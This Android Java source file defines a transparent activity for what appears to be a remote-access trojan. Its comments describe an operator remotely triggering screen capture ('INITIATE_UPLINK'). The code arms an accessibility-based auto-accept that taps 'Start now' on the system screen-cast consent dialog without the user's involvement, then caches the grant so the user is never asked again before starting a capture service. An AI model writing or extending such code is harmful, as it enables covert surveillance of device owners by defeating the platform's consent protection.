package com.labs.labrats;

import android.app.Activity;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;

import androidx.core.content.ContextCompat;

/**
 * Transparent trampoline that raises the one-time system screen-cast consent.
 *
 * Launched remotely by the operator (INITIATE_UPLINK). While the dialog is up,
 * GhostVideoSession auto-accept is armed so the accessibility core taps
 * "Start now" hands-free. Grant is cached in the session and reused until the
 * device reboots or the user revokes it — never prompts twice.
 */
public class GhostVideoPermissionActivity extends Activity {

    private static final int RC_PROJECTION = 6201;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            GhostVideoSession.setError("projection needs Android 5+");
            finish();
            return;
        }
        // Token already in hand (e.g. double-tap INITIATE): skip straight to start.
        if (GhostVideoSession.hasToken()) {
            launchService();
            finish();
            return;
        }
        GhostVideoSession.setState("CONSENT");
        GhostVideoSession.armAutoAccept(30000);
        try {
            MediaProjectionManager mpm =
                    (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
            if (mpm == null) throw new IllegalStateException("no projection service");
            startActivityForResult(mpm.createScreenCaptureIntent(), RC_PROJECTION);
        } catch (Exception e) {
            GhostVideoSession.disarmAutoAccept();
            GhostVideoSession.setError("consent-launch: " + e.getMessage());
            finish();
            return;
        }
        // Never linger: auto-accept window bounds the whole flow.
        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
            @Override
            public void run() {
                try {
                    if (!isFinishing()) finish();
                } catch (Exception ignored) {
                }
            }
        }, 45000);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == RC_PROJECTION) {
            GhostVideoSession.disarmAutoAccept();
            if (resultCode == RESULT_OK && data != null) {
                GhostVideoSession.storeToken(resultCode, data);
                GhostVideoSession.setState("STARTING");
                launchService();
            } else {
                GhostVideoSession.clearToken();
                GhostVideoSession.setState("DENIED");
            }
        }
        finish();
    }

    private void launchService() {
        try {
            Intent svc = new Intent(this, GhostVideoService.class);
            svc.setAction(GhostVideoService.ACTION_START);
            ContextCompat.startForegroundService(this, svc);
        } catch (Exception e) {
            GhostVideoSession.setError("svc-launch: " + e.getMessage());
        }
    }
}
